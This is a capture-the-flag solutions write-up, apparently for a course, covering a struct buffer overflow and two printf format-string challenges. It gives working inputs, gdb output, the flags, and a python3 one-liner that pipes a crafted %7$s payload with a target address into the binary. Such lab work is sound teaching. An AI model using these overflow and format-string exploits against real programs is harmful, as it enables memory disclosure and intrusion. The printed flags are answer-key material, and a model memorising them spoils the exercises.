# Solutions

## Don't forget the lyrics
The struct `buf` and `lyrics` is organsied sequentially:
```cpp
struct {
    buf char[16]
    lyrics char[16]
}
```
Input `1234567890123456desert` to fill `buf` and set `lyrics` to `desert`.

Flag: `CZ4067{b0f_w1ll_n3v3r_l3t_y0u_d0wn}`

## Echo Chamber 1
`%n$p` prints the word (64 bits in hex) n steps away from the top of the stack.

`$p` reads 1 word at a time, each word is reversed.
```
62 7b 37 36 30 34 5a 43
75 66 33 72 34 63 5f 33
70 5f 68 37 31 77 5f 6c
7d 66 74 6e 31 72
```
`b{7604ZCuf3r4c_3p_h71w_l}ftn1r`

Flag: `CZ4067{b3_c4r3ful_w17h_pr1ntf}`

## Echo Chamber 2
`%n$s` prints the string at the pointer.

Run `gdb ./echo2_static`, `disassemble /m main`, the disassembled code has a hint:
```
    lea    0x2b9b(%rip),%rdi        # 0x404100 <flag> 
```

So we want to set this pointer on the stack.

If we run, and input
`AAAA %p %p %p %p %p %p %p %p`, we see that: `The cave echoes back: AAAA 0x7ffffffc1fc0 (nil) (nil) 0x40573d (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520`, `...414141` is `AAAA` which tells us the offset of our input on the stack, which is `6`.

Notice, for any input, it will push the stack pointer of our payload. Think `AAAA` pushes by 4 bytes (ASCII). Notice, if we read the offset at 6 but don't include `AAAA`, we would get: `0x20702520`. As such, we force pad 4 bytes, which would shift our true payload at offset 7.

Thus, we set the offset 7 stack value as the pointer to the flag like so:
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"%7$sAAAA" + b"\x00\x41\x40\x00\x00\x00\x00\x00")' | ./echo2_static
```
NOTE: This cannot be done by manual input.